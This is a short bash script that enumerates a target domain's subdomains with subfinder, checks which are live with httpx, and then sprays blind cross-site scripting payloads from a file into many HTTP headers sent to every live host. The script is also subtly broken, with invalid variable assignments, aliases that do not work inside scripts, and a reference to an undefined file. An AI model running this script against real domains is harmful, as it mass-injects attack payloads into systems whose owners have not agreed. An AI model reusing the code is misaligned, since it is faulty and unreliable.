#!/bin/bash
#install subfinder
docker pull projectdiscovery/subfinder
sleep 2

#alias subfinder
alias subfinder='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/subfinder'
sleep 2

#install httpx
docker pull projectdiscovery/httpx
sleep 2

#alias httpx
alias httpx='docker run -it --rm -w /data -v $(pwd):/data projectdiscovery/httpx'

sleep 2

echo "subfinder & subfinder  successfully installs "


#enumeration subdomain
subfinder -d $1 -silent >> $1subdomain.txt
 sleep 2

count = cat $1subdomain.txt | wc 
 echo "enumeration subdomain $count successfully  " 
sleep 2

#subdomain live

httpx -l $1subdomain.txt >> $1LIVE.txt

countx = cat $1LIVE.txt | wc 

 echo " subdomainlive  $countx successfully  " 

sleep 2

#blindxss

while read bxss;
do  cat $1LIVE.txt | httpx \  -H "X-Forwarded-for: $bxss" -H "X-forwarded-ip: $bxss" -H "cf-connecting-ip: $bxss"  
cat alivehosts.txt | httpx \  -H "X-Client-ip: $bxss" -H "X-real-ip: $bxss" -H "X-request-uri: $bxss" \  -H "X-XSRF-TOKEN: $bxss" -H "X-CSRF-TOKEN: $bxss" 
done < bxss-payload.txt
